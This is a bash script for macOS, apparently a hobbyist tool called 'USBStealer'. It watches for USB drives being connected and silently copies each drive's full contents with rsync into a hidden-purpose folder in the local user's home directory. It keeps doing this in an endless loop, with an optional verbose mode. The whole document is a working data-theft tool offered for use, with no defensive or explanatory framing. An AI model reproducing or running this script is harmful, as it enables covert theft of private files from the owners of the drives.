#!/bin/bash
#USBStealer by ShellBear


##########################
Directory="/Users/$(whoami)"
##########################
#The Main directory where files with be transfered
if [[ $1 = -v ]]; then
	echo "Running Verbose Mode"
fi
var=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l )
if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -eq 1 ]]; then
	echo "USB Connected"
	sleep 1
	name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	mkdir $Directory/USBStealer > /dev/null 2>&1
	mkdir $Directory/USBStealer/$(basename $name) > /dev/null 2>&1
	if [[ $1 = -v ]]; then
	rsync --progress -r -u  /$name/* $Directory/USBStealer/$(basename $name)
	echo "Transfer Finished"
	else
	rsync -r -u /$name/* $Directory/USBStealer/$(basename $name)
    echo "Transfer Finished"
fi
fi
while true; do 
if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -gt $var ]]; then
	echo "USB Connected"
	sleep 1
	name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	mkdir $Directory/USBStealer > /dev/null 2>&1
	mkdir $Directory/USBStealer/$(basename $name) > /dev/null 2>&1
	if [[ $1 = -v ]]; then
	rsync --progress -r -u  /$name/* $Directory/USBStealer/$(basename $name)
	else
	rsync -r -u /$name/* $Directory/USBStealer/$(basename $name)
fi
    echo "Transfer Finished"
	((var+=1))
elif [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -lt $var ]]; then
	echo "USB Disconnected"
	((var-=1))
fi
done
